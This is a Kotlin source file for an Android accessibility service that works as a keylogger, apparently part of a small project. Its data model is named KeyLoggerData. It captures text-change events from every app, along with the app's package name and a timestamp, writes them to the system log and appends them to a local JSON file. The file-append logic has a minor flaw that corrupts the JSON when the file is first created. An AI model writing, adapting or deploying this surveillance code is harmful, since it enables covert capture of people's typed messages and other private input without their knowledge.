package dev.kevalkanapriya.umbrellaacademy.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.os.Environment
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import dev.kevalkanapriya.umbrellaacademy.AccServiceLog
import dev.kevalkanapriya.umbrellaacademy.domain.model.KeyLoggerData
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.FileInputStream
import java.io.FileNotFoundException
import java.io.FileOutputStream
import java.io.IOException

class AccService: AccessibilityService() {


    private var context: Context? = null
    override fun onCreate() {
        super.onCreate()

        Log.d(AccServiceLog, "Service is Created")

        context = this
    }



    private fun getEventText(event: AccessibilityEvent?): String {
        val sb = StringBuilder()
        if (event != null) {
            for (s in event.text) {
                sb.append(s)
            }
        }
        return sb.toString()
    }

    private fun onTypeViewTextChanged(
        accessibilityEvent: AccessibilityEvent,
        accessibilityNodeInfo: AccessibilityNodeInfo? = null
    ) {


        // Package name
        val packageName = accessibilityEvent.packageName

        val data = KeyLoggerData(
            timestamp = accessibilityEvent.eventTime,
            package_name = packageName.toString(),
            text = accessibilityEvent.text.toString()
        )

        // Read existing data from the file
        val filePath = "${context?.filesDir}/accData.json"
        val existingData = try {
            FileInputStream(filePath).bufferedReader().use { it.readText() }
        } catch (e: FileNotFoundException) {
            e.printStackTrace()
        }


        // Append new data to the existing data
        val newData = Json.encodeToString(data)
        val updatedData = "$existingData,\n$newData"

        // Write the updated data back to the file
        try {
            FileOutputStream(filePath).use { it.write(updatedData.toByteArray()) }
        } catch (e: IOException) {
            e.printStackTrace()
        }




    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {

        if (event == null) return

        val l1 = getEventText(event)
        if (l1 != "") {
            Log.d("Acc Event", "$l1")
        }

        when (event.eventType) {


            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                Log.i(AccServiceLog, "Accessibility event (event type): Type view text changed")
                var typeViewTextChangedNodeInfo: AccessibilityNodeInfo? = null
                try {
                    typeViewTextChangedNodeInfo = event.source
                } catch (e: Exception) {
                    Log.e(AccServiceLog, e.message.toString())
                    Log.e(AccServiceLog, e.toString())
                    e.printStackTrace()
                }
                onTypeViewTextChanged(event, typeViewTextChangedNodeInfo)
            }


        }

    }

    override fun onInterrupt() {
        Log.d(AccServiceLog, "[-] Interrupted !!!")

    }

    override fun onServiceConnected() {
        super.onServiceConnected()

        Log.d(AccServiceLog, "[+] Connected")
        AccessibilityServiceInfo().apply {
            flags = AccessibilityServiceInfo.DEFAULT
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            serviceInfo = this
        }

    }



}